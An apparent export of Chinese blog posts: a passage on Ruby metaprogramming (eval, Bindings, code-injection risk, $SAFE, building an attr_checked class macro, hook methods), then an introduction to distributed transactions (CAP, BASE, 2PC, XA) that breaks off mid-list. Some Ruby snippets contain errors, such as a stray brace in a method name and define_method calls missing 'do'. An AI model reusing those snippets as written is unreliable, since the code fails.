obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">.</span>my_thod<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    可以把Binding对象看作是一个闭包，它只包含作用域而不包含代码，对于eval方法，可以传递一个Binding对象作为额外参数，代码可以在这个Binding对象所携带的作用域中执行</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">eval <span class="token string-literal"><span class="token string">"p @x"</span></span> <span class="token punctuation">,</span> obj<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>​    Ruby还定义了一个预定义常量<code>TOPLEVEL_BINDING</code>,它表示顶级作用域的Binding对象。可以在程序任务地方访问到。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">eval <span class="token string-literal"><span class="token string">"self"</span></span><span class="token punctuation">,</span><span class="token constant">TOPLEVEL_BINDING</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>​    其中在我们最早使用Ruby时都使用过<code>irb</code>,其实就是解析控制台或者文件输入，再把每一行代码传递给eval方法执行，这种类型的程序有时被称为<code>代码处理器</code></p>
<p>​    eval方法后面三个为可选参数，statement代表执行语句，@binding表示所在作用域，file表示文件，line表示执行行号,这对于查找问题时比较方便</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">eval<span class="token punctuation">(</span>statement<span class="token punctuation">,</span><span class="token variable">@binding</span><span class="token punctuation">,</span>file<span class="token punctuation">,</span>line<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="对比代码字符串-与-块"><a href="#对比代码字符串-与-块" class="headerlink" title="对比代码字符串 与 块"></a>对比代码字符串 与 块</h3><p>eval 只能执行代码字符串</p>
<p>Instance_eval，class_eval 可以执行Block，也能执行代码字符串</p>
<p>一般能使用Block，就使用Block</p>
<h4 id="eval麻烦"><a href="#eval麻烦" class="headerlink" title="eval麻烦"></a>eval麻烦</h4><ol>
<li>不能利用编辑器的功能特性，例如高亮</li>
<li>难以阅读与修改</li>
<li>错误隐藏到执行期</li>
<li>安全性！！！</li>
</ol>
<h4 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h4><p>​    这里用Java操作SQL时，遇到的SQL注入问题为例，就是我们在执行SQL前，如果SQL使用字符串拼接，如果用户传递恶意参数，就会导致SQL注入问题，代码注入也是类似的。</p>
<h4 id="防止代码注入"><a href="#防止代码注入" class="headerlink" title="防止代码注入"></a>防止代码注入</h4><p>​    有些人会禁用eval方法，毕竟可以找到替换的方式，Ruby也提供了更安全的方法</p>
<h4 id="污染对象和安全级别"><a href="#污染对象和安全级别" class="headerlink" title="污染对象和安全级别"></a>污染对象和安全级别</h4><p>​    Ruby会自动把不安全对象标记为污染对象，比如：Web表单，文件，命令行读取，可以通过<code>obj.tainted?</code> 来判断</p>
<h4 id="安全级别"><a href="#安全级别" class="headerlink" title="安全级别"></a>安全级别</h4><p>​    可以通过给$SAFE全局变量赋值来实现，一共有四个级别</p>
<p>0 ： 随意操作</p>
<p>1 ： 拒绝执行污染字符串</p>
<p>2 ： 禁止绝大多数与文件相关的操作</p>
<p>3 ： 每个创建对象都为被污染</p>
<p>​    为了谨慎使用安全级别，可以为eval方法创建一个可控环境，也称为<strong>沙盒</strong>，比如在一个块儿内，执行eval方法。</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>​    写一个attr_accessor类宏类似的方法，attr_checked，与访问器类似，但是会对属性进行校验，attr_checked 可以接受属性名和代码块，代码块用来进行校验，如果是对属性赋值，判断Block中是否为true，如果为false则报错。需求通过一组代码进行展示</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># 这里是一个测试gem ，使用 gem install test-unit</span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">"test/unit"</span></span>
<span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">;</span><span class="token keyword">end</span>
<span class="token keyword">class</span> <span class="token class-name">TestCheckedAttribute</span> <span class="token operator">&lt;</span> Test<span class="token double-colon punctuation">::</span>Unit<span class="token double-colon punctuation">::</span>TestCase
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">setup</span></span>
    <span class="token comment"># 在Person类中，加入 age 的读写方法，并对age的写操作进行校验</span>
		add_checked_attribute<span class="token punctuation">(</span>Person<span class="token punctuation">,</span><span class="token symbol">:age</span><span class="token punctuation">)</span>
		<span class="token variable">@bob</span> <span class="token operator">=</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">new</span>
	<span class="token keyword">end</span>

	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">test_accept_vaild_values</span></span>
		<span class="token variable">@bob</span><span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">20</span>
		assert_equal <span class="token number">20</span><span class="token punctuation">,</span><span class="token variable">@bob</span><span class="token punctuation">.</span>age
	<span class="token keyword">end</span>

	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">test_refuses_nil_values</span></span>
		assert_raises RuntimeError<span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"Invalid attribute"</span></span> <span class="token keyword">do</span>
			<span class="token variable">@bob</span><span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token keyword">nil</span>
		<span class="token keyword">end</span>
	<span class="token keyword">end</span>

	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">test_refuses_false_values</span></span>
		assert_raises RuntimeError<span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"Invalid attribute"</span></span> <span class="token keyword">do</span>
			<span class="token variable">@bob</span><span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token boolean">false</span>
		<span class="token keyword">end</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token comment"># 这里是我们负责编写的代码 ， klass表示一个类对象，attribute表示需要给该类加入属性</span>
<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">add_checked_attribute</span></span><span class="token punctuation">(</span>klass<span class="token punctuation">,</span>attribute<span class="token punctuation">)</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<ol>
<li>使用eval进行快速的单元测试</li>
</ol>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># 先定义一个函数，利用eval方法执行字符串代码</span>
<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">add_checked_attribute</span></span><span class="token punctuation">(</span>klass<span class="token punctuation">,</span>attribute<span class="token punctuation">)</span>
	eval "
	  <span class="token comment"># 打开类</span>
		<span class="token keyword">class</span> <span class="token comment">#&#123;klass&#125;</span>
			<span class="token comment"># 根据参数生成，get，set方法</span>
			<span class="token keyword">def</span> <span class="token comment">#&#123;attribute&#125;=(value)</span>
				<span class="token keyword">raise</span> <span class="token string-literal"><span class="token string">'Invalid attribute'</span></span> <span class="token keyword">unless</span> value
				@<span class="token comment">#&#123;attribute&#125; = value</span>
			<span class="token keyword">end</span>

			<span class="token keyword">def</span> <span class="token comment">#&#123;attribute&#125;()</span>
				@<span class="token comment">#&#123;attribute&#125;</span>
			<span class="token keyword">end</span>
		<span class="token keyword">end</span>
	"
<span class="token keyword">end</span>
<span class="token comment"># 这里对String添加属性my_attr</span>
add_checked_attribute<span class="token punctuation">(</span><span class="token builtin">String</span><span class="token punctuation">,</span><span class="token symbol">:my_attr</span><span class="token punctuation">)</span>
obj <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"a"</span></span>
obj<span class="token punctuation">.</span>my_attr <span class="token operator">=</span> <span class="token number">123</span>
p obj<span class="token punctuation">.</span>my_attr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="2">
<li>重构add_checked_attribute方法，把eval方法使用Ruby方法替换掉</li>
</ol>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">add_checked_attribute</span></span><span class="token punctuation">(</span>klass<span class="token punctuation">,</span>attribute<span class="token punctuation">)</span>
	<span class="token comment"># 这里使用class_eval打开类的作用域，替换eval，因为替换后无法使用class，因为class关键字无法接受使用参数作为类名</span>
	klass<span class="token punctuation">.</span>class_eval <span class="token keyword">do</span>
		<span class="token comment"># 使用扁平作用域，使用define_method 替换 def，因为这里方法名也是动态的</span>
		<span class="token keyword">define_method</span> <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">attribute</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">="</span></span> <span class="token keyword">do</span> <span class="token operator">|</span>value<span class="token operator">|</span>
			<span class="token keyword">raise</span> <span class="token string-literal"><span class="token string">"Invalid attribute"</span></span> <span class="token keyword">unless</span> value
      <span class="token comment"># 这里通过Object#instance_variable_* 方法来操作实例比变量</span>
			instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">attribute</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>value<span class="token punctuation">)</span>
		<span class="token keyword">end</span>
		<span class="token keyword">define_method</span> <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">attribute</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">do</span>
			instance_variable_get<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">attribute</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
		<span class="token keyword">end</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
add_checked_attribute<span class="token punctuation">(</span><span class="token builtin">String</span><span class="token punctuation">,</span><span class="token symbol">:my_attr</span><span class="token punctuation">)</span>
obj <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"a"</span></span>
obj<span class="token punctuation">.</span>my_attr <span class="token operator">=</span> <span class="token number">123</span>
p obj<span class="token punctuation">.</span>my_attr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="3">
<li>完成通过一个Block来校验属性，</li>
</ol>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">add_checked_attribute</span></span><span class="token punctuation">(</span>klass<span class="token punctuation">,</span>attribute<span class="token punctuation">,</span><span class="token operator">&amp;</span>validation<span class="token punctuation">)</span>
	klass<span class="token punctuation">.</span>class_eval <span class="token keyword">do</span>
		<span class="token keyword">define_method</span> <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">attribute</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">=&#125;"</span></span> <span class="token keyword">do</span> <span class="token operator">|</span>value<span class="token operator">|</span>
			<span class="token keyword">raise</span> <span class="token string-literal"><span class="token string">"Invalid attribute"</span></span> <span class="token keyword">unless</span> validation<span class="token punctuation">.</span>call<span class="token punctuation">(</span>value<span class="token punctuation">)</span>
			instance_variable_set <span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">attribute</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>value
		<span class="token keyword">end</span>
		<span class="token keyword">define_method</span> <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">attribute</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">do</span>
			instance_variable_get <span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">attribute</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
		<span class="token keyword">end</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="4">
<li>内核方法改造成一个类宏，让它对所有的类定义中都可用，我们试着在class或module中定义，并且我们不需要再指类对象，通过self即可读取到</li>
</ol>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Class</span>
  <span class="token comment"># 这样所有对象都有拥有这个方法了</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">attr_checked</span></span><span class="token punctuation">(</span>attribute<span class="token punctuation">,</span><span class="token operator">&amp;</span>validation<span class="token punctuation">)</span>
		<span class="token keyword">define_method</span> <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">attribute</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">="</span></span> <span class="token keyword">do</span> <span class="token operator">|</span>value<span class="token operator">|</span>
			<span class="token keyword">raise</span> <span class="token string-literal"><span class="token string">"Invalid attribute"</span></span> <span class="token keyword">unless</span> validation<span class="token punctuation">.</span>call<span class="token punctuation">(</span>value<span class="token punctuation">)</span>
			instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">attribute</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>value<span class="token punctuation">)</span>
		<span class="token keyword">end</span>
		<span class="token keyword">define_method</span> <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">attribute</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span> 
			instance_variable_get<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">attribute</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
		<span class="token keyword">end</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="钩子方法"><a href="#钩子方法" class="headerlink" title="钩子方法"></a>钩子方法</h4><p>​    也就是在代码运行中，有各种事件，我们可以利用事件进行操作，这个就叫做钩子方法</p>
<ol>
<li>类被继承时触犯</li>
</ol>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">String</span>
  <span class="token comment"># inherited方法为Class的实例方法，我们可以进行覆写操作</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">inherited</span></span><span class="token punctuation">(</span>subclass<span class="token punctuation">)</span>
    p <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content"><span class="token keyword">self</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> was inherited by </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">subclass</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="2">
<li>模块儿被引入</li>
</ol>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">module</span> <span class="token class-name">M1</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">included</span></span><span class="token punctuation">(</span>othermod<span class="token punctuation">)</span>
    p <span class="token string-literal"><span class="token string">"M1 was included into </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">othermod</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token keyword">module</span> <span class="token class-name">M2</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">prepended</span></span><span class="token punctuation">(</span>othermod<span class="token punctuation">)</span>
    p <span class="token string-literal"><span class="token string">"M2 was prepended to </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">othermod</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token keyword">class</span> <span class="token class-name">C</span>
  <span class="token keyword">include</span> <span class="token constant">M1</span>
  <span class="token keyword">prepend</span> <span class="token constant">M2</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="3">
<li>模块儿新增方法事件</li>
</ol>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">module</span> <span class="token class-name">M</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">method_added</span></span><span class="token punctuation">(</span>method<span class="token punctuation">)</span>
    p <span class="token string-literal"><span class="token string">"New method: M#</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">method</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
  <span class="token keyword">end</span>
  
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_method</span></span><span class="token punctuation">;</span><span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>我们现在需要保证，引入CheckedAttributes的类才运行使用<code>attr_checked</code></p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">module</span> <span class="token class-name">CheckedAttributes</span>
	<span class="token comment"># 当类include CheckedAttributes 时被触发</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">included</span></span><span class="token punctuation">(</span>base<span class="token punctuation">)</span>
		<span class="token comment"># 将类extend ClassMethods，也就是转为base类的类方法</span>
		base<span class="token punctuation">.</span><span class="token keyword">extend</span> ClassMethods
	<span class="token keyword">end</span>

	<span class="token keyword">module</span> <span class="token class-name">ClassMethods</span>
		<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">attr_checked</span></span><span class="token punctuation">(</span>attribute<span class="token punctuation">,</span><span class="token operator">&amp;</span>validation<span class="token punctuation">)</span>
			<span class="token keyword">define_method</span> <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">attribute</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">="</span></span> <span class="token keyword">do</span> <span class="token operator">|</span>value<span class="token operator">|</span>
				<span class="token keyword">raise</span> <span class="token string-literal"><span class="token string">"Invalid attribute"</span></span> <span class="token keyword">unless</span> validation<span class="token punctuation">.</span>call<span class="token punctuation">(</span>value<span class="token punctuation">)</span>
				instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">attribute</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>value<span class="token punctuation">)</span>
			<span class="token keyword">end</span>
			<span class="token keyword">define_method</span> <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">attribute</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span> 
				instance_variable_get<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">attribute</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
			<span class="token keyword">end</span>
		<span class="token keyword">end</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>​    这里我们编写了自己的类宏，并使用了钩子方法。我们已经可以所使用的对象为所欲为，剩下的就交给我们不断的实践。后面我们将开启Rails之旅。</p>
]]></content>
      <categories>
        <category>Ruby</category>
      </categories>
      <tags>
        <tag>元编程</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式事务</title>
    <url>//post/%E5%88%86%E5%B8%83%E5%BC%8F/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​        我们在过去总是使用本地事务，也就是数据库提供的事务操作，其中具有ACID的特性，但在如今我们的各个模块儿被拆分，服务与服务间相互调用，简单来说就是需要跨进程的事务，我们来想一下现有的本地事务是否能解决分布式事务。<br /><strong>情况1</strong>：跨JVM，跨数据库产生分布式事务<br /></p>
<pre class="line-numbers language-mermaid" data-language="mermaid"><code class="language-mermaid"><span class="token keyword">graph</span> TD<span class="token punctuation">;</span>
    用户下订单<span class="token arrow operator">--></span>订单模块<span class="token punctuation">;</span>
    订单模块<span class="token arrow operator">--></span>物流模块<span class="token punctuation">;</span>
    订单模块<span class="token arrow operator">--></span>订单表<span class="token punctuation">;</span>
    物流模块<span class="token arrow operator">--></span>物流表<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><br />        用户直接调用订单模块儿，开启事务，然后在订单表中存入数据，然后再远程调用物流模块儿，去操作物流模块儿，我们可以想到如果物流模块儿出现问题，订单模块儿远程调用发生错误，是会进行事务回滚的。应该是没问题的。那如果物流模块儿确实修改成功了，但网络传输出现了问题，订单模块儿就进行回滚了，则就导致了物流模块儿有数据，订单模块儿没数据的问题。我们再考虑下面的问题：<br /></p>
<p><strong>情况二</strong>：跨数据库实例产生分布式事务<br /></p>
<pre class="line-numbers language-mermaid" data-language="mermaid"><code class="language-mermaid"><span class="token keyword">graph</span> TD<span class="token punctuation">;</span>
    人员管理模块儿<span class="token arrow operator">--></span>用户数据库<span class="token punctuation">;</span>
    人员管理模块儿<span class="token arrow operator">--></span>订单数据库<span class="token punctuation">;</span>
    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="前置理论"><a href="#前置理论" class="headerlink" title="前置理论"></a>前置理论</h2><p><a name="fbcqR"></a></p>
<h3 id="CAP理论"><a href="#CAP理论" class="headerlink" title="CAP理论"></a>CAP理论</h3><p>​        CAP表示一致性，可用性，分区容忍性。下面我们用数据库读写分离来演示</p>
<blockquote>
<p>整体执行流程如下： </p>
</blockquote>
<p>1、商品服务向主数据库写入商品信息（添加商品、修改商品、删除商品） <br />2、主数据库向商品服务响应写入成功。 <br />3、商品服务请求从数据库读取商品信息。 </p>
<h4 id="一致性"><a href="#一致性" class="headerlink" title="一致性"></a>一致性</h4><p>​        表示写操作如果成功，各个节点上的读操作，应能读到最新的数据。</p>
<blockquote>
<p>那么应如何保证？</p>
</blockquote>
<ol>
<li>在写入主数据库后应立刻将数据同步到从数据库中</li>
<li>在同步期间应对从数据库加锁，以防止读取到过期的数据</li>
</ol>
<p>那这就存在一定的问题：比如加锁后的性能损耗。</p>
<h4 id="可用性"><a href="#可用性" class="headerlink" title="可用性"></a>可用性</h4><p>指的是任何事务操作都能得到响应结果，不会出现响应超时，响应错误的问题。允许我读到之前的数据，但不允许接收不到数据</p>
<blockquote>
<p>如何保证？</p>
</blockquote>
<ol>
<li>数据还是应从主数据库同步到从数据库</li>
<li>不能将资源锁定</li>
<li>可以返回旧数据，甚至是默认数据，但不能返回错误数据或响应超时</li>
</ol>
<h4 id="分区容忍性"><a href="#分区容忍性" class="headerlink" title="分区容忍性"></a>分区容忍性</h4><p>在微服务中数据分布到各个节点中，在网络分区中，允许因为网络问题导致的节点通信失败，但该节点应能继续对外提供服务，举例：1. 主数据库向从数据库同步失败，不能影响节点的读写操作 2. 其中一个节点挂了不能影响另一个。</p>
<blockquote>
<p>如何操作</p>
</blockquote>
<ol>
<li>尽量使用异步操作同步数据，让节点松耦合</li>
<li>多添加从节点，保证备份节点</li>
</ol>
<p>分区容忍性应该是分布式下最重要的特性。</p>
<blockquote>
<p>在CAP理论中，是否三个特性能同时满足？</p>
</blockquote>
<p>​        不能，在分区容忍性必备的情况下，一致性与可用性间存在矛盾，所以应看情况保证CP或者AP的特性。<br /><strong>AP特性</strong>：放弃一致性，比如订单退款，并不是瞬间让钱到账，而是允许二十四小时内到账。<br /><strong>CP特性</strong>：保证一致性，数据必须同步到最新状态，比如跨行转账，必须双方都完后事务才算完成。<br />一般情况下，使用的是AP特性，保证服务的可用。</p>
<h3 id="BASE理论"><a href="#BASE理论" class="headerlink" title="BASE理论"></a>BASE理论</h3><p>​        BASE 是 Basically Available(<strong>基本可用</strong>)、Soft state(<strong>软状态</strong>)和 Eventually consistent (<strong>最终一致性</strong>)三个短语的缩写。BASE理论是对<strong>CAP中AP的一个扩展</strong>，通过牺牲强一致性来获得可用性，<code>当出现故障，允许部分功能不可用，但要保证核心功能可用，允许数据在一段时间内是不一致的，但最终要达到一致状态</code>。满足BASE理论的事务，我们称之为“<strong>柔性事务</strong>”。</p>
<ol>
<li>基本可用：分布式系统中允许损失部分可用功能，来保证核心功能的可用</li>
<li>软状态：因为不要求强一致性，存在过渡状态，比如订单的支付中，数据同步中等状态，最后改为成功状态。</li>
<li>最终一致性：就是从中间状态最终一定达到数据一致。<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="分布式事务解决方案—2PC（两阶段提交）"><a href="#分布式事务解决方案—2PC（两阶段提交）" class="headerlink" title="分布式事务解决方案—2PC（两阶段提交）"></a>分布式事务解决方案—2PC（两阶段提交）</h3>2PC也称为两阶段提交，顾名思义是将事务分为两个阶段，准备阶段（Prepare），提交阶段（Commit）。举个栗子：</li>
</ol>
<blockquote>
<p>张三和李四好久不见，老友约起聚餐，饭店老板要求先买单，才能出票。这时张三和李四分别抱怨近况不如 意，囊中羞涩，都不愿意请客，这时只能AA。只有张三和李四都付款，老板才能出票安排就餐。</p>
<ol>
<li>准备阶段：老板要求张三付款，张三付款。老板要求李四付款，李四付款。 </li>
<li>提交阶段：老板出票，两人拿票纷纷落座就餐。 </li>
</ol>
</blockquote>
<p>​        例子中形成了一个事务，若张三或李四其中一人拒绝付款，或钱不够，店老板都不会给出票，并且会把已收款退回。<br />        整个事务过程由事务管理器和参与者组成，店老板就是事务管理器，张三、李四就是事务参与者，事务管理器负责决策整个分布式事务的提交和回滚，事务参与者负责自己本地事务的提交和回滚。 </p>
<p>而在一些关系型数据库中（Oracle，Mysql）都是支持两阶段提交协议</p>
<ol>
<li> 准备阶段（Prepare phase）：事务管理器给每个参与者发送Prepare消息，每个数据库参与者在本地执行事务，并写本地的Undo/Redo日志，此时事务没有提交。（Undo日志是记录修改前的数据，用于数据库回滚，Redo日志是记录修改后的数据，用于提交事务后写入数据文件)，这时候资源是被锁定的。</li>
<li>提交阶段（commit phase）：如果事务管理器收到了参与者的执行失败或者超时消息时，直接给每个参与者发送回滚(Rollback)消息；否则，发送提交(Commit)消息；参与者根据事务管理器的指令执行提交或者回滚操作，并释放事务处理过程中使用的锁资源。注意:必须在最后阶段释放锁资源。 <blockquote>
<p>成功情况：</p>
</blockquote>
</li>
</ol>
<p><img src="../../typora-user-images/image-20221202172257629.png" alt="image-20221202172257629"></p>
<blockquote>
<p>失败情况：</p>
</blockquote>
<p><img src="../../typora-user-images/image-20221202172314630.png" alt="image-20221202172314630"></p>
<h4 id="XA方案"><a href="#XA方案" class="headerlink" title="XA方案"></a>XA方案</h4><blockquote>
<p>DTP模型定义如下角色：<br><strong>AP</strong>(Application Program)：即应用程序，可以理解为使用DTP分布式事务的程序。<br><strong>RM</strong>(Resource Manager)：即资源管理器，可以理解为事务的参与者，一般情况下是指一个数据库实例，通过资源管理器对该数据库进行控制，资源管理器控制着分支事务。<br><strong>TM</strong>(Transaction Manager)：事务管理器，负责协调和管理事务，事务管理器控制着全局事务，管理事务生命周期，并协调各个RM。<strong>全局事务</strong>是指分布式事务处理环境中，需要操作多个数据库共同完成一个工作，这个工作即是一个全局事务。<br>DTP模型定义TM和RM之间通讯的接口规范叫<strong>XA</strong>，简单理解为数据库提供的2PC接口协议，<strong>基于数据库的XA 协议来实现2PC又称为XA方案</strong>。<br>以上三个角色之间的交互方式如下： </p>
<ol>
<li>TM向AP提供 应用程序编程接口，AP通过TM提交及回滚事务。 </li>
